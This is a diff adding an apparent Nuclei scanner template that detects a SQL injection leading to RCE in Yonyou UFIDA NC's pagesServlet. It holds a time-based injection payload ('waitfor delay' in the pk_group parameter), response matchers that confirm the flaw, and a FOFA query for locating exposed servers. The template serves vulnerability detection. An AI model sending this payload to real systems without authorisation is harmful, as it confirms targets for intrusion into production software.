@@ -1,0 +1,28 @@
+id: yonyou-ufida-nc-pagesservlet-sqli
+
+info:
+  name: 用友NC pagesServlet SQL注入致RCE
+  author: qwtd
+  severity: high
+  description: 用友NC pagesServlet SQL注入致RCE
+  metadata:
+    fofa-query: app="用友-UFIDA-NC"
+  tags: 用友-U8,用友-NC-Cloud,Yonyou-UFIDA-NC,Yonyou-U8-Cloud
+
+http:
+  - raw:
+      - |
+        @timeout: 30s
+        GET /portal/pt/servlet/pagesServlet/doPost?pageId=login&pk_group=1'waitfor+delay+'0:0:5'-- HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36
+        Connection: keep-alive
+
+    matchers:
+      - type: dsl
+        dsl:
+          - "duration>=5"
+          - "status_code == 200"
+          - 'contains(body, "</Pages>")'
+        condition: and
